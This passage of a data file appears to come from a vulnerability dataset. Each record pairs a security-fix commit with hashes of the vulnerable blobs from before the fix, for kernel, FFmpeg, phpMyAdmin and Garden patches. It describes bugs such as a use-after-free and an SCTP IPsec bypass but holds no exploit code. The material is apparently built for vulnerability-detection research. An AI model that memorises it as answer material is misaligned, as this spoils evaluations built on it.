socket will already have been passed to kernel_setsockopt. Move the check into smb_send_rqst, so that it's checked earlier.\n\nIn truth, this is a bit of a half-assed fix. The -ENOTSOCK error return here looks like it could bubble back up to userspace. The locking rules around the ssocket pointer are really unclear as well. There are cases where the ssocket pointer is changed without holding the srv_mutex, but I'm not clear whether there's a potential race here yet or not.\n\nThis code seems like it could benefit from some fundamental re-think of how the socket handling should behave. Until then though, this patch should at least fix the above oops in most cases.\n\nCc: <stable@vger.kernel.org> # 3.7+ Reported-and-Tested-by: CAI Qian <caiqian@redhat.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>

======================================================================
Commit With Fix: 
    83078591bc4d263e77d2a2ca283100997755290d
File(s) In Commit: 
    library/database/class.sqldriver.php
Blob(s) In Commit: 
    6803584c06ceeb0ecc04b32831628151fc7ec8f8
Blob(s) Before Fix: 
    2d6ad6f9a838fc738cb975ad305cf7c191b78df8
    3a131b8ea818544b21148bc16000b2860feb9eed
    c64da8a8fff9ed12e856f4aaaae15cd74483e22a
Projects:
    08_Garden
Commit Message for 83078591bc4d263e77d2a2ca283100997755290d:
Disable the ability to call functions in escaped sql strings.

======================================================================
Commit With Fix: 
    9b3551601ce714adb5e3f428476052f0ec6093bf
File(s) In Commit: 
    view_create.php
Blob(s) In Commit: 
    cd2ec3b616e6b5455df67628e955971b4de5b0a4
Blob(s) Before Fix: 
    07164a52dff5f19f53d53771bcb51c57ae6193e3
    0cf2c3047b5144bc6c5e8e97c1ab0122efe38452
    3e36efbf194a15bf8177fe107b6fe41f5090413e
    5ea2aa33643bc40d6488a61edaa3d7ada88e9f6b
    8fca46c9aff33553c34b389e3ee9905a483829f4
    ce3f8ff72197e5608434360793c12b58b61226c8
    d59eb9c39bbb8d0644010ff6cbef30e6f402d689
    d8781295d882f23827576ae008485fba5fe9e180
    d9f4f007d265d037afc2a7a3ebfa0b82cca56673
Projects:
    007durgesh219_phpmyadmin
Commit Message for 9b3551601ce714adb5e3f428476052f0ec6093bf:
escape query in error message

======================================================================
Commit With Fix: 
    307f2fb95e9b96b3577916e73d92e104f8f26494
File(s) In Commit: 
    net/ipv6/ip6_fib.c
Blob(s) In Commit: 
    5fc9c7a68d8d102aef37b7b13ab1dd772553a9cb
Blob(s) Before Fix: 
    0f9b37a1c1d4025e2e7076a5bf2d12848dfec39d
    192dd1a0e18810f01923b43ef5f4a75c5b5d8d35
    2221ff6a308bceb6f66e447265db1d590fe3f9d4
    24995a93ef8c94b22224dd344a9d474a72d28cc1
    46458ee3193939f7975219728ddacd9e6fe78492
    5bec666aba61d464fab4e77684eedd4265143cf9
    60832766196054f1f03d2aa12558febf68e032d8
    710cafd2e1a9f7a7308ffc4fa82a02abec431523
    93717435013e0a146c10bc8cf3ea4cbddb627f9b
    9c06ecb6556e6600162aac78018e3f196295b851
    e85fdd74496cad8692329bf7505b9a1c62e084aa
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 307f2fb95e9b96b3577916e73d92e104f8f26494:
ipv6: only static routes qualify for equal cost multipathing\n\nStatic routes in this case are non-expiring routes which did not get configured by autoconf or by icmpv6 redirects.\n\nTo make sure we actually get an ecmp route while searching for the first one in this fib6_node's leafs, also make sure it matches the ecmp route assumptions.\n\nv2: a) Removed RTF_EXPIRE check in dst.from chain. The check of RTF_ADDRCONF    already ensures that this route, even if added again without    RTF_EXPIRES (in case of a RA announcement with infinite timeout),    does not cause the rt6i_nsiblings logic to go wrong if a later RA    updates the expiration time later.\n\nv3: a) Allow RTF_EXPIRES routes to enter the ecmp route set. We have to do so,    because an pmtu event could update the RTF_EXPIRES flag and we would    not count this route, if another route joins this set. We now filter    only for RTF_GATEWAY|RTF_ADDRCONF|RTF_DYNAMIC, which are flags that    don't get changed after rt6_info construction.\n\nCc: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    dd7633ecd553a5e304d349aa6f8eb8a0417098c5
File(s) In Commit: 
    drivers/vhost/net.c
Blob(s) In Commit: 
    8ca5ac71b8452210517c128b6b7c12e7af832b4f
Blob(s) Before Fix: 
    22356797a90e17003ff30d7116cdece3058f243e
    2b51e2336aa20006e47cb0f1ac7ea146120413a3
    5c170100de9ca766854c37f8d85956251653baba
    7f93f34b7f913e188aa31fbe82372f409817e9dd
    959b1cd89e6a5be5a402a79089077609f8e30716
    c7fdabd0e5d312e2c85e5f2984be68fd504d8da3
    d6a518ce4d6df38036069d2c8d93c2007673e116
    dfff647e713938e61f593db076a78ca853fc9725
    e224a92baa16c808b9f3d8c2baa4b449f210c214
    ebd08b21b23432696047487367d44f76d4fa4f02
    ec6fb3fa59bb5962281bb6277220941b91df053c
    f80d3dd41d8c6d420c8fb2d640a81739f2049674
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for dd7633ecd553a5e304d349aa6f8eb8a0417098c5:
vhost-net: fix use-after-free in vhost_net_flush\n\nvhost_net_ubuf_put_and_wait has a confusing name: it will actually also free it's argument. Thus since commit 1280c27f8e29acf4af2da914e80ec27c3dbd5c01     "vhost-net: flush outstanding DMAs on memory change" vhost_net_flush tries to use the argument after passing it to vhost_net_ubuf_put_and_wait, this results in use after free. To fix, don't free the argument in vhost_net_ubuf_put_and_wait, add an new API for callers that want to free ubufs.\n\nAcked-by: Asias He <asias@redhat.com> Acked-by: Jason Wang <jasowang@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    75a493e60ac4bbe2e977e7129d6d8cbb0dd236be
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    be7589ef5cf942c5bb0c2aa27d251c31420e9fb4
Blob(s) Before Fix: 
    dae1949019d7b8dc77d14c39478571e86ad89f34
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 75a493e60ac4bbe2e977e7129d6d8cbb0dd236be:
ipv6: ip6_append_data_mtu did not care about pmtudisc and frag_size\n\nIf the socket had an IPV6_MTU value set, ip6_append_data_mtu lost track of this when appending the second frame on a corked socket. This results in the following splat:\n\n[37598.993962] ------------[ cut here ]------------ [37598.994008] kernel BUG at net/core/skbuff.c:2064! [37598.994008] invalid opcode: 0000 [#1] SMP [37598.994008] Modules linked in: tcp_lp uvcvideo videobuf2_vmalloc videobuf2_memops videobuf2_core videodev media vfat fat usb_storage fuse ebtable_nat xt_CHECKSUM bridge stp llc ipt_MASQUERADE nf_conntrack_netbios_ns nf_conntrack_broadcast ip6table_mangle ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 iptable_nat +nf_nat_ipv4 nf_nat iptable_mangle nf_conntrack_ipv4 nf_defrag_ipv4 xt_conntrack nf_conntrack ebtable_filter ebtables ip6table_filter ip6_tables be2iscsi iscsi_boot_sysfs bnx2i cnic uio cxgb4i cxgb4 cxgb3i cxgb3 mdio libcxgbi ib_iser rdma_cm ib_addr iw_cm ib_cm ib_sa ib_mad ib_core iscsi_tcp libiscsi_tcp libiscsi +scsi_transport_iscsi rfcomm bnep iTCO_wdt iTCO_vendor_support snd_hda_codec_conexant arc4 iwldvm mac80211 snd_hda_intel acpi_cpufreq mperf coretemp snd_hda_codec microcode cdc_wdm cdc_acm [37598.994008]  snd_hwdep cdc_ether snd_seq snd_seq_device usbnet mii joydev btusb snd_pcm bluetooth i2c_i801 e1000e lpc_ich mfd_core ptp iwlwifi pps_core snd_page_alloc mei cfg80211 snd_timer thinkpad_acpi snd tpm_tis soundcore rfkill tpm tpm_bios vhost_net tun macvtap macvlan kvm_intel kvm uinput binfmt_misc +dm_crypt i915 i2c_algo_bit drm_kms_helper drm i2c_core wmi video [37598.994008] CPU 0 [37598.994008] Pid: 27320, comm: t2 Not tainted 3.9.6-200.fc18.x86_64 #1 LENOVO 27744PG/27744PG [37598.994008] RIP: 0010:[<ffffffff815443a5>]  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330 [37598.994008] RSP: 0018:ffff88003670da18  EFLAGS: 00010202 [37598.994008] RAX: ffff88018105c018 RBX: 0000000000000004 RCX: 00000000000006c0 [37598.994008] RDX: ffff88018105a6c0 RSI: ffff88018105a000 RDI: ffff8801e1b0aa00 [37598.994008] RBP: ffff88003670da78 R08: 0000000000000000 R09: ffff88018105c040 [37598.994008] R10: ffff8801e1b0aa00 R11: 0000000000000000 R12: 000000000000fff8 [37598.994008] R13: 00000000000004fc R14: 00000000ffff0504 R15: 0000000000000000 [37598.994008] FS:  00007f28eea59740(0000) GS:ffff88023bc00000(0000) knlGS:0000000000000000 [37598.994008] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [37598.994008] CR2: 0000003d935789e0 CR3: 00000000365cb000 CR4: 00000000000407f0 [37598.994008] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [37598.994008] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [37598.994008] Process t2 (pid: 27320, threadinfo ffff88003670c000, task ffff88022c162ee0) [37598.994008] Stack: [37598.994008]  ffff88022e098a00 ffff88020f973fc0 0000000000000008 00000000000004c8 [37598.994008]  ffff88020f973fc0 00000000000004c4 ffff88003670da78 ffff8801e1b0a200 [37598.994008]  0000000000000018 00000000000004c8 ffff88020f973fc0 00000000000004c4 [37598.994008] Call Trace: [37598.994008]  [<ffffffff815fc21f>] ip6_append_data+0xccf/0xfe0 [37598.994008]  [<ffffffff8158d9f0>] ? ip_copy_metadata+0x1a0/0x1a0 [37598.994008]  [<ffffffff81661f66>] ? _raw_spin_lock_bh+0x16/0x40 [37598.994008]  [<ffffffff8161548d>] udpv6_sendmsg+0x1ed/0xc10 [37598.994008]  [<ffffffff812a2845>] ? sock_has_perm+0x75/0x90 [37598.994008]  [<ffffffff815c3693>] inet_sendmsg+0x63/0xb0 [37598.994008]  [<ffffffff812a2973>] ? selinux_socket_sendmsg+0x23/0x30 [37598.994008]  [<ffffffff8153a450>] sock_sendmsg+0xb0/0xe0 [37598.994008]  [<ffffffff810135d1>] ? __switch_to+0x181/0x4a0 [37598.994008]  [<ffffffff8153d97d>] sys_sendto+0x12d/0x180 [37598.994008]  [<ffffffff810dfb64>] ? __audit_syscall_entry+0x94/0xf0 [37598.994008]  [<ffffffff81020ed1>] ? syscall_trace_enter+0x231/0x240 [37598.994008]  [<ffffffff8166a7e7>] tracesys+0xdd/0xe2 [37598.994008] Code: fe 07 00 00 48 c7 c7 04 28 a6 81 89 45 a0 4c 89 4d b8 44 89 5d a8 e8 1b ac b1 ff 44 8b 5d a8 4c 8b 4d b8 8b 45 a0 e9 cf fe ff ff <0f> 0b 66 0f 1f 84 00 00 00 00 00 66 66 66 66 90 55 48 89 e5 48 [37598.994008] RIP  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330 [37598.994008]  RSP <ffff88003670da18> [37599.007323] ---[ end trace d69f6a17f8ac8eee ]---\n\nWhile there, also check if path mtu discovery is activated for this socket. The logic was adapted from ip6_append_data when first writing on the corked socket.\n\nThis bug was introduced with commit 0c1833797a5a6ec23ea9261d979aa18078720b74 ("ipv6: fix incorrect ipsec fragment").\n\nv2: a) Replace IPV6_PMTU_DISC_DO with IPV6_PMTUDISC_PROBE. b) Don't pass ipv6_pinfo to ip6_append_data_mtu (suggestion by Gao    feng, thanks!). c) Change mtu to unsigned int, else we get a warning about    non-matching types because of the min()-macro type-check.\n\nAcked-by: Gao feng <gaofeng@cn.fujitsu.com> Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6160968cee8b90a5dd95318d716e31d7775c4ef3
File(s) In Commit: 
    kernel/user_namespace.c
Blob(s) In Commit: 
    6e50a44610eedc4b5ebeece393b9c9331b0b5abb
Blob(s) Before Fix: 
    8b650837083e74f7c8bcac7b4f83081c448e36ed
    9064b919a4066fe9fca676581479e9162de56717
    d8c30db06c5b75456098fe2f1a26785e9a9110ee
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6160968cee8b90a5dd95318d716e31d7775c4ef3:
userns: unshare_userns(&cred) should not populate cred on failure\n\nunshare_userns(new_cred) does *new_cred = prepare_creds() before create_user_ns() which can fail. However, the caller expects that it doesn't need to take care of new_cred if unshare_userns() fails.\n\nWe could change the single caller, sys_unshare(), but I think it would be more clean to avoid the side effects on failure, so with this patch unshare_userns() does put_cred() itself and initializes *new_cred only if create_user_ns() succeeeds.\n\nCc: stable@vger.kernel.org Signed-off-by: Oleg Nesterov <oleg@redhat.com> Reviewed-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9955ac47f4ba1c95ecb6092aeaefb40a22e99268
File(s) In Commit: 
    arch/arm64/kernel/traps.c
Blob(s) In Commit: 
    f30852d28590358c6780a22c14049f92a124bdb8
Blob(s) Before Fix: 
    0805b44f986a5707d2129e74fd4490f1b3650223
    0da47699510b685f5d56d9d4cde2a0dfb9ca9242
    18f8fa52e511c9895f9f9c3da1a9aeffb0047c17
    2589ef53973af45601bf7fb552da64f736075197
    3883f842434fab09e103186ec9d8a3b146724d16
    488a7b36d48e9dea10f317f722178036432cd59e
    61d7dd29f756c300926410cef60ab523a5a7a7b1
    671136e1a6f05085116132a4d6d0c198a1644fa4
    7d1f6c5cfa65c91b81ec92126a4691a3d8fc2254
    7ffadddb645d32cda5fd54a0c2a5a0c5456b4018
    a6740d06a6ba6a060d14ae80cb3b0f7c25785cc4
    b3c5f628bdb45490bbf863e5c195f81bc74938c6
    de1b085e796396be5f6ce6c5932a3e418ade432e
    f1ff9bad00f79a2531d7663f378f52a2c1686f6f
    f4c668fa2cbee6cdb60dcdc47465854ba4997be4
    f93aae5e43075ccd4e6db45c2198965e566330a5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9955ac47f4ba1c95ecb6092aeaefb40a22e99268:
arm64: don't kill the kernel on a bad esr from el0\n\nRather than completely killing the kernel if we receive an esr value we can't deal with in the el0 handlers, send the process a SIGILL and log the esr value in the hope that we can debug it. If we receive a bad esr from el1, we'll die() as before.\n\nSigned-off-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    1fc29bacedeabb278080e31bb9c1ecb49f143c3b
File(s) In Commit: 
    fs/cifs/connect.c
Blob(s) In Commit: 
    e3bc39bb9d12b224d7cda96e2e55b9babed68c0b
Blob(s) Before Fix: 
    0ae86ddf22138180383542548b3fb7e003c94453
    12b3da39733b2bc180cd1ac4a164d9f0d071e99a
    21b3a291c327c1e3871d110725ed972ce8ab21ba
    54125e04fd0c88d4c17d7833b557e21c1696bcb3
    5b97e56ddbca8fd8b4a4552c95acd97d5ca6c318
    6c4b48064044122f33bebebd37489ad705f0cc5d
    8813ff776ba3a988e2773147f86406e5013d9047
    8cd4b52d42174ee0a4d524d3176b59102751c61e
    991c63c6bdd053189082c6208407a5df55b29053
    99eeaa17ee006956d37350cad00bfd854c8b5306
    9e6ee471e4c2d6e78966dbe3a032c8cec997e266
    afcb8a1a33b7dcb273eba95331248a781b42e27a
    b39bb4a06b6f932445bdfa932e137fe724729dc3
    d05a30072023c563e48059b6ac0bddeda3f0a794
    d6a5c5ac737b75d802030d77ef82ec04e3a0a12e
    e0b56d7a19c561be0b173a670d18f6d8435a12ed
    f771e9f98f9f52b04a4f7a49ef0ecd10a46d78df
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1fc29bacedeabb278080e31bb9c1ecb49f143c3b:
cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed the code such that the vol->prepath no longer contained a leading delimiter and then fixed up the places that accessed that field to account for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the pointer addition on pos, that patch failed to account for the fact that we had already incremented "pos" by one when adding the length of the prepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of "pos".\n\nCc: <stable@vger.kernel.org> # v3.8+ Reported-by: Marcus Moeller <marcus.moeller@gmx.ch> Reported-by: Ken Fallon <ken.fallon@gmail.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>

======================================================================
Commit With Fix: 
    c95eb3184ea1a3a2551df57190c81da695e2144b
File(s) In Commit: 
    arch/arm/kernel/perf_event.c
Blob(s) In Commit: 
    0500f10b50413428da67219c395572a8fae4752d
Blob(s) Before Fix: 
    3f6a6d3fc5c2d021047ccdf3abd7ed702b74a635
    d9f5cd4e533fef948f68510e3a6fb3b4996b750b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c95eb3184ea1a3a2551df57190c81da695e2144b:
ARM: 7809/1: perf: fix event validation for software group leaders\n\nIt is possible to construct an event group with a software event as a group leader and then subsequently add a hardware event to the group. This results in the event group being validated by adding all members of the group to a fake PMU and attempting to allocate each event on their respective PMU.\n\nUnfortunately, for software events wthout a corresponding arm_pmu, this results in a kernel crash attempting to dereference the ->get_event_idx function pointer.\n\nThis patch fixes the problem by checking explicitly for software events and ignoring those in event validation (since they can always be scheduled). We will probably want to revisit this for 3.12, since the validation checks don't appear to work correctly when dealing with multiple hardware PMUs anyway.\n\nCc: <stable@vger.kernel.org> Reported-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>

======================================================================
Commit With Fix: 
    2960576378d17d71cc8dccc926352ce568b5eec1
File(s) In Commit: 
    libavcodec/g2meet.c
Blob(s) In Commit: 
    99d4d1ec37b266dce2bf68bc0a4169e346885d4d
Blob(s) Before Fix: 
    199e8af08009bf995588f1343237787960c8b25b
    57c6fb8db6b4e48093aa08914c121235d9f29168
    bc01dfafc850e786bd984415a199784905ff760b
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2960576378d17d71cc8dccc926352ce568b5eec1:
avcodec/g2meet: fix src pointer checks in kempf_decode_tile()\n\nFixes Ticket2842\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    c94f9e854228e0ea00e1de8769d8d3f7cab84a55
File(s) In Commit: 
    libavutil/mem.c
Blob(s) In Commit: 
    20dfd629a84110c37b0aba81533764867795222c
Blob(s) Before Fix: 
    5aad97aa930b8727a639a7f09e1a6ea206508aef
    76f6b65d1abfa2ffbc0905a8847e33bbbe728b9e
    860c0111eb53c0a069f98caf48501807f984cd77
    a53676c553535288cfa9d28aaea4886e251f9d0c
    e901533cc716f1b9e9c714f1d6c3a207005fd127
Projects:
    00ERNEST00_FFmpeg
Commit Message for c94f9e854228e0ea00e1de8769d8d3f7cab84a55:
avutil/mem: Fix flipped condition\n\nFixes return code and later null pointer dereference\n\nFound-by: Laurent Butti <laurentb@gmail.com> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    2433c8f094a008895e66f25bd1773cdb01c91d01
File(s) In Commit: 
    net/sysctl_net.c
Blob(s) In Commit: 
    e7000be321b0148469264524ed6fce75c3952955
Blob(s) Before Fix: 
    3f6e31069c547ebb8b7a850da018f1a3e1169234
    45422794b16833d7bf97a959990b829b08a43f65
    46a71c701e7c44f5aa5fcc69e8571382434e385b
    47ac8c05615279068fc33cf85dce0f18adfe77cb
    919981324171bd2028ed3a8662d16bf77f520c1a
    9aed6fe1bf1ad67057d5ec001806729cd5988a94
    9bc6db04be3ea7cd998f41187ff40b19baa9c920
    c3e65aebecc08f85b3d5d471d9ce65908f7ea2d8
    ca84212cfbfede9c42f4b99cdd484149b6bc0471
    e3a6e37cd1c536cc93d5caa850219e4104bb646b
    e3b0ba726df5d7d524f2ae9b4e13831ed2608a8b
    e75813904f266e158a3df4649ed3813d14f47539
    e8500d2d3c3c69b890336c451587b6022ec4f429
    ed98c1fc3de1428560ea370413084102af9dff7f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2433c8f094a008895e66f25bd1773cdb01c91d01:
net: Update the sysctl permissions handler to test effective uid/gid\n\nModify the code to use current_euid(), and in_egroup_p, as in done in fs/proc/proc_sysctl.c:test_perm()\n\nCc: stable@vger.kernel.org Reviewed-by: Eric Sandeen <sandeen@redhat.com> Reported-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e9c6a182649f4259db704ae15a91ac820e63b0ca
File(s) In Commit: 
    drivers/md/dm-snap-persistent.c
Blob(s) In Commit: 
    2d2b1b7588d7e476b7fc814a63c82bad2edb1ed6
Blob(s) Before Fix: 
    135c2f1fdbfcc95aefb0d842030e71a089e87d30
    2847a0bcf264bbd2645a45b565785f73df26e09c
    3ac415675b6c778b5dd22aaaf4ee6c2dc4ca48eb
    4caa8e6d59d7968584e23a9187bc07f8c81df321
    4d3909393f2cce5488ced8843ccab1375d40d2d9
    72827c35cb6aba84ee1df4c7a14c672fa7ccdb28
    75c182bfd1286a7336e624ff162a5c978ff0cc7f
    8f6d3ea55401a346800cae89499484997bf57e3c
    95891dfcbca021563a465751dacf064aee3a46df
    97c3f0651c4147c752f3d75ab3e706a696f64418
    9df0d79755036c7ea8019be2e4a6c2872483f0f2
    bf71583296f732b6b78c71ae67dee5222824b2f8
    d3272acc0f0e02976b30d8f2ea19128768439679
    d6e88178d22cff0e88fb8b21cb20558f51e8d6a1
    e4ecadf0548a72c8cca30b169c2feb80a06719b5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for e9c6a182649f4259db704ae15a91ac820e63b0ca:
dm snapshot: fix data corruption\n\nThis patch fixes a particular type of data corruption that has been encountered when loading a snapshot's metadata from disk.\n\nWhen we allocate a new chunk in persistent_prepare, we increment ps->next_free and we make sure that it doesn't point to a metadata area by further incrementing it if necessary.\n\nWhen we load metadata from disk on device activation, ps->next_free is positioned after the last used data chunk. However, if this last used data chunk is followed by a metadata area, ps->next_free is positioned erroneously to the metadata area. A newly-allocated chunk is placed at the same location as the metadata area, resulting in data or metadata corruption.\n\nThis patch changes the code so that ps->next_free skips the metadata area when metadata are loaded in function read_exceptions.\n\nThe patch also moves a piece of code from persistent_prepare_exception to a separate function skip_metadata to avoid code duplication.\n\nCVE-2013-4299\n\nSigned-off-by: Mikulas Patocka <mpatocka@redhat.com> Cc: stable@vger.kernel.org Cc: Mike Snitzer <snitzer@redhat.com> Signed-off-by: Alasdair G Kergon <agk@redhat.com>

======================================================================
Commit With Fix: 
    d661684cf6820331feae71146c35da83d794467e
File(s) In Commit: 
    net/core/scm.c
Blob(s) In Commit: 
    b4da80b1cc07d28eafec50a6185d6d2a2ece61af
Blob(s) Before Fix: 
    03795d0147f2995e09495c98dcf3c94cb3d5511f
    07741268e457b3de7bf4771d160214ef30a6f563
    2dc6cdaaae8abc5f31afa57a7ccf765cc978b6ac
    3b6899b7d810d569057b051162b51fde7c51cba8
    4c1ef026d6955b8cadaf77ceee6538dd4b4e1800
    611c5efd4cb0b71abeb9b3d965acbf490673e644
    7a6cf8351cde8e45004a9a2cfa92f434cf4a47af
    811b53fb330e8a40e640db483965acfc8c55cc4a
    905dcc6ad1e3b480c01f87df5157f4e37de112a1
    a0bde6517efd647311eab26e3ba323df1b58016c
    a2ebf30f6aa8c358c9759809ae0f5fe7ceea8275
    b442e7e25e601b19a8237d1a90efbaa1d572fc19
    d30eb057fa7b89ddec6d9a83b045fbd6c6a64fe3
    dbc6bfcdf44649a8a7cf835783317e4976930605
    dce0acb929f169774c93c42e0a97c8df656ad342
    ff52ad0a51501c98891401d6e29f18dfab80ade9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d661684cf6820331feae71146c35da83d794467e:
net: Check the correct namespace when spoofing pid over SCM_RIGHTS\n\nThis is a security bug.\n\nThe follow-up will fix nsproxy to discourage this type of issue from happening again.\n\nCc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Reviewed-by: "Eric W. Biederman" <ebiederm@xmission.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    95ee62083cb6453e056562d91f597552021e6ae7
File(s) In Commit: 
    net/sctp/ipv6.c
Blob(s) In Commit: 
    4f52e2ce263d0852bf01cc286560f8d13fbe208a
Blob(s) Before Fix: 
    09ffcc912d236426b5c5f7724d7145db31b061bf
    391a245d520316c865aad51424b94b9fe6fb8bf7
    da613ceae28cc95b38dc1a3d7366c2f38b348d9b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 95ee62083cb6453e056562d91f597552021e6ae7:
net: sctp: fix ipv6 ipsec encryption bug in sctp_v6_xmit\n\nAlan Chester reported an issue with IPv6 on SCTP that IPsec traffic is not being encrypted, whereas on IPv4 it is. Setting up an AH + ESP transport does not seem to have the desired effect:\n\nSCTP + IPv4:\n\n  22:14:20.809645 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 116)     192.168.0.2 > 192.168.0.5: AH(spi=0x00000042,sumlen=16,seq=0x1): ESP(spi=0x00000044,seq=0x1), length 72   22:14:20.813270 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 340)     192.168.0.5 > 192.168.0.2: AH(spi=0x00000043,sumlen=16,seq=0x1):\n\nSCTP + IPv6:\n\n  22:31:19.215029 IP6 (class 0x02, hlim 64, next-header SCTP (132) payload length: 364)     fe80::222:15ff:fe87:7fc.3333 > fe80::92e6:baff:fe0d:5a54.36767: sctp     1) [INIT ACK] [init tag: 747759530] [rwnd: 62464] [OS: 10] [MIS: 10]\n\nMoreover, Alan says:\n\n  This problem was seen with both Racoon and Racoon2. Other people have seen   this with OpenSwan. When IPsec is configured to encrypt all upper layer   protocols the SCTP connection does not initialize. After using Wireshark to   follow packets, this is because the SCTP packet leaves Box A unencrypted and   Box B believes all upper layer protocols are to be encrypted so it drops   this packet, causing the SCTP connection to fail to initialize. When IPsec   is configured to encrypt just SCTP, the SCTP packets are observed unencrypted.\n\nIn fact, using `socat sctp6-listen:3333 -` on one end and transferring "plaintext" string on the other end, results in cleartext on the wire where SCTP eventually does not report any errors, thus in the latter case that Alan reports, the non-paranoid user might think he's communicating over an encrypted transport on SCTP although he's not (tcpdump ... -X):\n\n  ...   0x0030: 5d70 8e1a 0003 001a 177d eb6c 0000 0000  ]p.......}.l....   0x0040: 0000 0000 706c 6169 6e74 6578 740a 0000  ....plaintext...\n\nOnly in /proc/net/xfrm_stat we can see XfrmInTmplMismatch increasing on the receiver side. Initial follow-up analysis from Alan's bug report was done by Alexey Dobriyan. Also thanks to Vlad Yasevich for feedback on this.\n\nSCTP has its own implementation of sctp_v6_xmit() not calling inet6_csk_xmit(). This has the implication that it probably never really got updated along with changes in inet6_csk_xmit() and therefore does not seem to invoke xfrm handlers.\n\nSCTP's IPv4 xmit however, properly calls ip_queue_xmit() to do the work. Since a call to inet6_csk_xmit() would solve this problem, but result in unecessary route lookups, let us just use the cached flowi6 instead that we got through sctp_v6_get_dst(). Since all SCTP packets are being sent through sctp_packet_transmit(), we do the route lookup / flow caching in sctp_transport_route(), hold it in tp->dst and skb_dst_set() right after that. If we would alter fl6->daddr in sctp_v6_xmit() to np->opt->srcrt, we possibly could run into the same effect of not having xfrm layer pick it up, hence, use fl6_update_dst() in sctp_v6_get_dst() instead to get the correct source routed dst entry, which we assign to the skb.\n\nAlso source address routing example from 625034113 ("sctp: fix sctp to work with ipv6 source address routing") still works with this patch! Nevertheless, in RFC5095 it is actually 'recommended' to not use that anyway due to traffic amplification [1]. So it seems we're not supposed to do that anyway in sctp_v6_xmit(). Moreover, if we overwrite the flow destination here, the lower IPv6 layer will be unable to put the correct destination address into IP header, as routing header is added in ipv6_push_nfrag_opts() but then probably with wrong final destination. Things aside, result of this patch is that we do not have any XfrmInTmplMismatch increase plus on the wire with this patch it now looks like:\n\nSCTP + IPv6:\n\n  08:17:47.074080 IP6 2620:52:0:102f:7a2b:cbff:fe27:1b0a > 2620:52:0:102f:213:72ff:fe32:7eba:     AH(spi=0x00005fb4,seq=0x1): ESP(spi=0x00005fb5,seq=0x1), length 72   08:17:47.074264 IP6 2620:52:0:102f:213:72ff:fe32:7eba > 2620:52:0:102f:7a2b:cbff:fe27:1b0a:     AH(spi=0x00003d54,seq=0x1): ESP(spi=0x00003d55,seq=0x1), length 296\n\nThis fixes Kernel Bugzilla 24412. This security issue seems to be present since 2.6.18 kernels. Lets just hope some big passive adversary in the wild didn't have its fun with that. lksctp-tools IPv6 regression test suite passes as well with this patch.\n\n [1] http://www.secdev.org/conf/IPv6_RH_security-csw07.pdf\n\nReported-by: Alan Chester <alan.chester@tekelec.com> Reported-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2811ebac2521ceac84f2bdae402455baa6a7fb47
File(s) In Commit: 
